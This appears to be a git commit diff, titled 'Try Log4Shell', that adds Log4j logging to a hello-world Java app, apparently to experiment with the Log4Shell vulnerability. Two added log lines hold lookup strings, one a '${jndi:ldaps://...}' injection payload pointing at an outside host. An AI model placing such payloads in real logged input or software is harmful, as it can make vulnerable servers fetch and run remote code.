afe801075f9481aeea1f062cfdca49a8d81f81f6
Jakub <jmayday@users.noreply.github.com>
2021-12-17 22:41:35 +0100

    Try Log4Shell

--- src/main/java/org/example/App.java
+++ src/main/java/org/example/App.java
@@ -1,13 +1,21 @@
 package org.example;
 
+import org.apache.logging.log4j.Level;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
 /**
  * Hello world!
  *
  */
-public class App 
+public class App
 {
+    private static final Logger logger = LogManager.getLogger(App.class);
+
     public static void main( String[] args )
     {
+        logger.log(Level.INFO, "Logging... ${java:runtime}");
+        logger.log(Level.WARN, "${jndi:ldaps://github.com/jmayday/groovy-playground/blob/main/src/resources/ldap-entry}");
         System.out.println( "Hello World!" );
     }
 }
